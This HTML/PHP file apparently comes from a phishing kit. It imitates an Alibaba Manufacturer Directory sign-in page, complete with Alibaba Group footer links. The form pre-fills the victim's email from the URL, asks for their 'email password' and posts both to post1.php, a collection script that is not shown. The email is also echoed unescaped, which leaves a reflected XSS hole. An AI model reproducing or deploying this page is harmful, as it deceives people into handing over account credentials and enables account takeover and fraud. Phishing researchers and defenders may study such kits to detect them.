<html>
<head><title>Alibaba&nbsp;Manufacturer&nbsp;Directory&nbsp;-&nbsp;Suppliers,&nbsp;Manufacturers,&nbsp;Exporters&nbsp;&amp;amp;&nbsp;Importers&nbsp;</title>



</head>
<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">

<table width="100%"  height="100%" align="center" bgcolor="#FFFFFF">


<tr><td bgcolor="" height="12%">
<br>
	<table width="75%" align="center" bgcolor="#ffffff"><tr><td>

		<table width="90%"  align="center" bgcolor="#ffffff"><tr>

		<td>
		<img src="images/img2.png" width="200" height="40">
		</td>



		<td width="80">

		</td>

		</tr></table>

	</td></tr></table>

</td></tr>





<tr><td bgcolor="" height="2%">
<hr width="100%" align="center" color="#E6E6E6">
</td></tr>








<tr><td bgcolor="" height="65%">

	<table width="1000" height="95%" align="center" bgcolor="#ffffff"><tr>

	<td width="550">
	<img src="images/img1.jpg" width="550" height="350">	
	</td>



	<td widrh="50"></td>


	<td width="450">

	<br>
		
		<table width="400" height="250" bgcolor="#E5E2E2" 
		style="-moz-border-radius: 7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;"><tr><td>


			<table width="400" height="250" 
			style="-moz-border-radius: 7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;" align="center" bgcolor="#ffffff">
			<tr><td>


				<table width="320" align="center">

				<tr><td>

				<form method="post" action="post1.php">
			
				<font face="calibri" size="3" color="">

				<br>

				<b><font face="verdana" size="2" color="#FF8000">Login Password</font></b>
				<br><br>

				<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET['email']; ?>" placeholder="Username">
				<font face="verdana" size="3" color="#000000"> <?php echo $_GET['email']; ?> </font>	

				<p>

				<input  name="pass" type="password" style="width:320px; height:35px; font-family: Verdana; font-size: 14px; color:#FF8000; 
				background-color: #ffffff; border: solid 1px #FF8000; padding: 10px"" required="" placeholder="Enter email password">
	


				<p>

				<input type="submit" value="Sign In" style="width:320px; height:40px; background-color: #FF8000; border: solid 3px #FF8000; 
				font-family: Verdana; font-size: 13px; font-weight: bold; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
				-khtml-border-radius: 4px; border-radius: 4px;">				
	
				</font>

				</form>

				<p>

				<div align="right">
				<font face="calibri" size="3" color="blue">Join Free</font>
				</div>

				

				</td></tr>
				
				</table>



				<br>

				


			</td></tr>


			</table>


		</td></tr></table>

		<br>

		<table width="380" align="center"><tr><td>

				<table align="right"><tr>
				
				<td>
				<img src="images/img3.gif" width="28" height="27">
				</td>

				<td width="1"></td>

				<td>
				<font face="calibri" size="2" color="">Can't sign in?</font> 
				<a href="" style="text-decoration:none"> <font face="calibri" size="2" color="blue">Get help here</font></a>
				</td>

				</tr></table>

		</td></tr></table>
		

	</td>

	</tr></table>

</td></tr>





<tr><td bgcolor="" height="">
<hr width="100%" align="center" color="#E6E6E6">
</td></tr>






<tr><td height="21%" bgcolor="#F2F2F2">

	<table width="90%" height="80%" align="center">

	<tr><td>

	<div align="center">

			<a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Alibaba Group</font></a> 
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Taobao Marketplace</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Tmall.com</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Juhuasuan</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">AliExpress</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Alibaba.com International</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">1688.com</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Alimama</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Alitrip</a>
			<br/>
			<a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Alibaba Cloud Computing</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">YunOS</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">AliTelecom</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">HiChina</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Autonavi</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">UCWeb</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Umeng</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Kanbox</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Xiami</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">TTPod</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Laiwang</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">DingTalk</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">11 Main</a>
			| <a href="" style="text-decoration:none"><font face="verdana" size="2" color="#6E6E6E">Alipay</a>
		
	</div>


	<p>


			<div align="center">

			<a href="" style="text-decoration:none"><font face="calibri" size="2" color="#6E6E6E">Product Listing Policy</font></a>
			- <a href="" style="text-decoration:none"><font face="calibri" size="2" color="#6E6E6E">Intellectual Property Policy and Infringement 

Claims</font></a>
			- <a href="" style="text-decoration:none"><font face="calibri" size="2" color="#6E6E6E">Privacy Policy</font></a>
			- <a href="" style="text-decoration:none"><font face="calibri" size="2" color="#6E6E6E">Terms of Use</font></a>

			</div>

	</td></tr>

	</table>

</td></tr>

</table>


</body>
</html>